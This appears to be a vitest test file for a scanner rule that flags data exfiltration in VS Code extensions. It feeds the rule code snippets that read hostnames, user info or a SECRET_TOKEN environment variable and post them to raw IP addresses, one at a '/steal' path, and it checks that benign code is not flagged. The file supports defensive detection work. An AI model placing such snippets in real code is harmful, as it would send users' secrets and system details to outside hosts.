import { describe, it, expect } from 'vitest';
import { critDataExfiltration } from '../../src/rules/built-in/crit-data-exfiltration.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('EG-CRIT-001: Data Exfiltration', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test',
    publisher: 'test',
    version: '1.0.0',
  };

  it('should detect system info collection + HTTP to IP', () => {
    const files = new Map([
      ['src/extension.js', `
        const os = require('os');
        const hostname = os.hostname();
        https.request('https://45.33.32.156/collect', {});
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toContain('hostname');
    expect(evidences[0]?.matchedPattern).toContain('http-to-ip');
  });

  it('should detect os.userInfo + HTTP to IP', () => {
    const files = new Map([
      ['src/extension.js', `
        const info = os.userInfo();
        fetch('http://192.168.1.1/api', { method: 'POST', body: info });
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
  });

  it('should detect process.env access + HTTP to IP', () => {
    const files = new Map([
      ['src/extension.js', `
        const token = process.env.SECRET_TOKEN;
        axios.post('https://10.0.0.1/steal', { token });
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
  });

  it('should not flag normal code without exfiltration', () => {
    const files = new Map([
      ['src/extension.js', `
        const vscode = require('vscode');
        function activate(context) {
          console.log('Hello');
        }
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });

  it('should not flag HTTP to domain (only IP)', () => {
    const files = new Map([
      ['src/extension.js', `
        const os = require('os');
        os.hostname();
        fetch('https://api.github.com/repos');
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });

  it('should not flag system info without network call', () => {
    const files = new Map([
      ['src/extension.js', `
        const os = require('os');
        console.log(os.hostname());
        console.log(os.platform());
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });
});
